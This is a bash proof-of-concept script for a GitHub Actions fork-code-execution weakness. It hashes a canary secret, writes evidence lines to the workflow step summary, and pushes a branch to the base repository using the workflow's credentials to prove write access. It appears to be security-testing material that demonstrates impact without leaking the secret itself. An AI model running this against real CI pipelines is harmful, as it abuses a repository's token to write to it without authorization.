#!/usr/bin/env bash
set -euo pipefail

canary_hash=$(printf '%s' "$R151_CANARY" | sha256sum | cut -d' ' -f1)
evidence=$(cat <<EOF
R151_FORK_CODE_EXECUTED=1
R151_CANARY_SHA256=$canary_hash
R151_SOURCE_REPOSITORY=$GITHUB_REPOSITORY
R151_TRIGGER_ACTOR=$GITHUB_ACTOR
EOF
)
printf '%s\n' "$evidence"
{
  printf '%s\n' "$evidence"
} >> "$GITHUB_STEP_SUMMARY"

git remote add r151-owner "https://github.com/$GITHUB_REPOSITORY.git"
git push r151-owner HEAD:refs/heads/r151-token-write
printf 'R151_DURABLE_BASE_WRITE=refs/heads/r151-token-write\n'
